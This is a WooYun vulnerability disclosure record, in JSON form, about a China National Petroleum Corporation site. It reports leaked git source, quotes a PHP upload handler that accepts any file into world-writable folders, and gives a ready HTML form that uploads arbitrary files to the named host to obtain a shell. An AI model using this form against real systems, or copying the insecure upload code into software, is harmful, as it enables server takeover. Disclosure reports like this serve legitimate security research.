{"id": 46807, "wybug_id": "wooyun-2014-089350", "wybug_title": "中石油某站源码重构到GetShell", "wybug_corp": "中国石油天然气集团公司", "wybug_author": "杀器王子", "wybug_date": "2014-12-30 15:46", "wybug_open_date": "2015-02-13 15:48", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向公众公开  简要描述： 中石油某站源码重构到getshell 详细说明：  1.85.51.141存在git源码泄露对应域名 http://mtp.cnpc.com.cn\n\n\n\n\n\n   漏洞证明：  审计代码/resources/data/appstore/appOperate.php31行开始\nif ($act == 'uploadFile') {\tif(!is_dir(\"../../files/appfiles\")){  //如果不存在该文件夹\t\tmkdir(\"../../files/appfiles\", 0777);  //创建文件夹\t\tchmod(\"../../files/appfiles\", 0777);  //改变文件模式\t}\t// 上传app文件 appFileName\t$appname = $_FILES ['appFileName'] ['name'];\t$mktime = time ();\t// 创建文件夹\t$mkfile = '../../files/appfiles/' . $mktime . '/';\tmkdir ( $mkfile, 0777 );\t\t// $optionDir = '/mdm/www/resources/files/appfiles/'.$mktime;\t\t// exec('chmod 0777 '.$optionDir);\t\t$rand = $mktime . substr ( $appname, strrpos ( $appname, \".\" ) );\t$destination = $mkfile . $rand;\t\t$_SESSION ['filepath'] = $mktime;\t$_SESSION ['filename'] = $rand;\t\tif (move_uploaded_file ( $_FILES ['appFileName'] ['tmp_name'], $destination )) {\t\t$arr = array (\t\t\t\t'success' => true,\t\t\t\t'filename' => $rand,\t\t\t\t'localname' => $appname \t\t);\t} else {\t\t$arr = array (\t\t\t\t'success' => false,\t\t\t\t'reason' => $destination \t\t);\t}\t\techo json_encode ( $arr );\n任意文件上传 form\n<form method=\"post\" action=\"http://mtp.cnpc.com.cn/resources/data/appstore/appOperate.php\" enctype=\"multipart/form-data\">  <input name=\"appFileName\" type=\"file\" />  <input name=\"action\" type=\"text\" value=\"uploadFile\"/>  <input name=\"submit\" type=\"submit\" /></form>\n\n\n   修复方案：  删除git   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-31 12:57 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-30 17:24 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  我擦，太牛逼了，高质量高产！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}